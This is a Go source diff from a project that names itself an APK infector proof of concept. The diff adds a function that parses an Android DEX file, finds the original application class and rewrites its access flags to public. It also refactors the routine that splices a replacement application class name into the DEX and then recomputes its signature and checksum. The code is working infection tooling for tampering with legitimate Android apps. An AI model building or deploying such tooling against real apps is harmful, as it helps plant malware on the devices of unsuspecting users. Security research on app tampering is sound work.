@@ -1,16 +1,19 @@
 package dex
 
 import (
-	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/injector"
-	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/manifest"
 	"bytes"
 	"crypto/sha1"
 	"encoding/binary"
+	//"fmt"
 	"hash/adler32"
 	"log"
+	"os"
 	"path/filepath"
 	"strings"
-	"os"
+
+	"github.com/kaitai-io/kaitai_struct_go_runtime/kaitai"
+	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/manifest"
+	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/utils"
 )
 
 
@@ -82,6 +85,54 @@ func patchChecksum(data []byte) {
  */
 // Do not forget about alignment of some structures!
 
+func Patch_app_modifier(path string) {
+	// Открытие DEX-файла
+    f, err := os.Open(path)
+    if err != nil {
+        panic(err)
+    }
+    defer f.Close()
+
+	dexFile := NewDex()
+	err = dexFile.Read(kaitai.NewStream(f), nil, dexFile)
+	if err != nil {
+        panic(err)
+    }
+
+    // Ищем определение класса, которое соответствует типу
+    classDefs, err := dexFile.ClassDefs()
+    if err != nil {
+        panic(err)
+    }
+    for i, classDefItem := range classDefs {
+		typeName, _ := classDefItem.TypeName()
+		//accessFlags := classDefItem.AccessFlags
+		if typeName == utils.OldAppNameNormalized {
+			//fmt.Printf("typename : %s | accessFlags = %d\n", typeName, accessFlags)
+
+			newAccessFlags := uint32(0x1) // например, PUBLIC
+		
+			// Запись изменений обратно в DEX данные
+			classDefOffset := dexFile.Header.ClassDefsOff + uint32(i*32) // 32 - размер ClassDefItem
+			//fmt.Printf("classDefOffset = %x\n", classDefOffset)
+			data, err := os.ReadFile(path)
+			if err != nil {
+				panic(err)
+			}
+
+			binary.LittleEndian.PutUint32(data[classDefOffset+4:], newAccessFlags)
+		
+			// Сохранение модифицированного DEX-файла
+			//fmt.Printf("rewritten = %s\n", path)
+			outputFilename := path
+			err = os.WriteFile(outputFilename, data, 0644)
+			if err != nil {
+				panic(err)
+			}
+		}
+    }
+}
+
 func Patch() {
 
 	data, err := os.ReadFile(dexPath)
@@ -97,13 +148,13 @@ func Patch() {
 	// we should add "L" and ";", and convert "."->"/" to be a normal DEX string
 	//tmpName := "z.z.zzzzzzzzzzzzzzzz"
 	
-	oldAppNameNormalized := "L" + strings.ReplaceAll(manifest.OldAppNameUTF8, ".", "/") + ";"
+	utils.OldAppNameNormalized = "L" + strings.ReplaceAll(manifest.OldAppNameUTF8, ".", "/") + ";"
 	//oldAppNameNormalized := "L" + strings.ReplaceAll(tmpName, ".", "/") + ";"
-	newAppName := oldAppNameNormalized + "\x00"
+	newAppName := utils.OldAppNameNormalized + "\x00"
 
 	// patch string len (string_data_item->utf16_size)
 	// -1 - it's a position of len before every string in dex
-	data[placeholderOff - 1] = uint8(len(oldAppNameNormalized))
+	data[placeholderOff - 1] = uint8(len(utils.OldAppNameNormalized))
 
 	// how many bytes we added to DEX?
 	var sizeDiff uint32
@@ -206,5 +257,5 @@ func Patch() {
 	patchSignature(data[0:])
 	patchChecksum(data[0:])
 
-	injector.WriteChanges(data, dexPathNew)
+	utils.WriteChanges(data, dexPathNew)
 }
